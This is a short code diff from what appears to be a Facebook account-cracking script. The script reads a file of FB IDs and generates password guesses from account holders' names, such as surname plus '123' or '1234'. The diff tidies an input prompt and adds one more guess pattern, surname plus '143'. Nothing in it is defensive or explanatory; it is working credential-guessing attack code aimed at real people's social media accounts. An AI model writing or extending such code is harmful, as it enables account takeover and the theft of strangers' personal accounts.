@@ -54,7 +54,7 @@ def main():
 
 def file_iclone():
     print(cox)
-    fl=input("  [-]INPUT YOUR OWN FB IDS FILE TO START CRACKING.\n  \033[38;5;46m[•] FILE PATH: ")
+    fl=input("  [-] INPUT YOUR OWN FB IDS FILE TO START CRACKING.\n  \033[38;5;46m[•] FILE PATH: ")
     os.system('clear')
     print(logo)
     print(cox)
@@ -142,6 +142,7 @@ def auto_pass(fileeee):
                     pwx.append(sur_name+'123')
                     pwx.append(sur_name+'1234')
                     pwx.append(sur_name+'12345')
+                    pwx.append(sur_name+'143')
                     pwx.append(name1+mid_name+sur_name)
                     pwx.append(name1+mid_name+sur_name+'123')
                     pwx.append(name1+mid_name+sur_name+'1234')
